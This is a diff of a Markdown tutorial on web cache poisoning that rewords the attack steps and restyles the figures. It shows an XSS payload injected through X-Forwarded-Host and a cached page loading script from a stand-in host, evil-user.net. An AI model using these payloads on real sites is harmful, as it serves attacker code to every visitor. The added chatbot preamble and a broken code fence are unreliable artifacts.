@@ -64,41 +64,64 @@ Even short-lived caches can be re-poisoned continuously, making the effect persi
 
 ---
 
+Here is your section rewritten in a **clean, consistent, professional format** with centered images and captions to match the rest of your documentation style.
+
+---
+
 ## How to Construct a Web Cache Poisoning Attack
 
 ### 1. Identify Unkeyed Inputs
 
-These are often headers like:
+Unkeyed inputs are request components that influence the response but are **not included in the cache key**.
+
+These are often headers such as:
 
 * `X-Forwarded-Host`
 * `X-Forwarded-For`
 * `User-Agent`
 
-Use tools like **Burp Suite Param Miner**:
+Use tools like **Burp Suite – Param Miner**:
 
-* Right-click a request > Guess headers
-* Review the output tab for interesting behavior
+* Right-click a request → **Guess headers**
+* Review the **Output** tab for interesting behavior or reflected values
 
-> **Caution:** Use cache busters to avoid poisoning real user traffic during tests.
+> ⚠️ **Caution:** Always use cache busters during testing to avoid poisoning legitimate user traffic.
 
-<img width="863" height="615" alt="image" src="https://github.com/user-attachments/assets/fe9947bf-c4dc-477e-82d4-e00d8eeb1969" />
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/fe9947bf-c4dc-477e-82d4-e00d8eeb1969" width="800" alt="Param Miner Guess Headers">
+  <br>
+  <em>Figure: Using Param Miner to identify unkeyed headers</em>
+</p>
+
+---
 
 ### 2. Elicit a Harmful Response
 
-Once you find an unkeyed input:
+Once an unkeyed input is discovered:
 
-* Inject payloads and analyze reflection or response behavior
-* Look for improper sanitization or dynamic generation from headers
+* Inject payloads and observe response behavior
+* Look for reflection in HTML
+* Identify dynamic generation based on headers
+* Check for insufficient sanitization
+
+The goal is to craft a response that becomes malicious **once cached**.
+
+---
 
 ### 3. Get the Response Cached
 
-Trigger conditions that make the response cacheable:
+Ensure the malicious response is cacheable by triggering conditions such as:
 
 * `Cache-Control: public`
-* Use static-like routes or file extensions
-* Adjust content-type, status code, etc.
+* Targeting static-like routes (e.g., `/index.html`)
+* Influencing status codes or content types
+* Removing `Set-Cookie` headers if necessary
 
-<img width="1040" height="266" alt="image" src="https://github.com/user-attachments/assets/204efe52-05af-4e19-96b3-dee5a6c244b5" />
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/204efe52-05af-4e19-96b3-dee5a6c244b5" width="900" alt="Cached Response Example">
+  <br>
+  <em>Figure: Example of a cacheable poisoned response</em>
+</p>
 
 ---
 
@@ -112,7 +135,7 @@ Trigger conditions that make the response cacheable:
 GET /en?region=uk HTTP/1.1
 Host: innocent-website.com
 X-Forwarded-Host: a."><script>alert(1)</script>
-```
+````
 
 Response:
 
@@ -120,7 +143,7 @@ Response:
 <meta property="og:image" content="https://a."><script>alert(1)</script>/cms/social.png" />
 ```
 
-If cached, this payload is delivered to all users.
+If this response is cached, the malicious payload is served to all subsequent users.
 
 ---
 
@@ -138,13 +161,26 @@ Response:
 <script src="https://evil-user.net/static/analytics.js"></script>
 ```
 
-This results in arbitrary JS execution for every user who receives the cached page.
+This causes arbitrary JavaScript execution in the browsers of all users who receive the cached page.
 
 ---
 
-<img width="696" height="386" alt="image" src="https://github.com/user-attachments/assets/e63fec68-844f-442b-9f02-4821cc209b08" />
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/e63fec68-844f-442b-9f02-4821cc209b08" width="650" alt="Cache Poisoning Impact Diagram">
+  <br>
+  <em>Figure: Poisoned cache serving malicious content to multiple users</em>
+</p>
 
-<img width="884" height="366" alt="image" src="https://github.com/user-attachments/assets/7335dccd-a3a5-4f37-bb5a-aa8e8331ab4c" />
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/7335dccd-a3a5-4f37-bb5a-aa8e8331ab4c" width="850" alt="Web Cache Poisoning Flow">
+  <br>
+  <em>Figure: End-to-end web cache poisoning attack flow</em>
+</p>
+
+
+---
+
+
 
 
 ## Tools
